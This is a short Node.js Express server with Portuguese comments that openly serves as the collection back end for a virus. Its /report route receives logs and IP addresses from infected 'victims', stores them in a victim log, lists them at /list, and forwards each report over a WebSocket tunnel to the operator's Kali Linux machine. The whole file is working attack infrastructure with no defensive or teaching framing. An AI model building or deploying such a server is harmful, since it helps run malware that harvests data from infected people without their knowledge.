const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let kaliWS = null;
let victimsLog = []; // Salva informações das vítimas

app.use(express.json());

// Rota para o Vírus enviar dados (Logs/IPs)
app.post('/report', (req, res) => {
    const info = {
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        time: new Date().toISOString(),
        data: req.body
    };
    victimsLog.push(info);
    if (kaliWS) kaliWS.send(JSON.stringify({ type: 'LOG', info }));
    res.status(200).send('OK');
});

// Rota para ver as vítimas salvas (Proteja isso depois)
app.get('/list', (req, res) => res.json(victimsLog));

// Túnel WebSocket para o seu Kali
wss.on('connection', (ws) => {
    kaliWS = ws;
    console.log('Kali Linux Conectado ao Túnel!');
    ws.send(JSON.stringify({ message: "Túnel Ativo" }));
    ws.on('close', () => { kaliWS = null; });
});

server.listen(process.env.PORT || 3000);
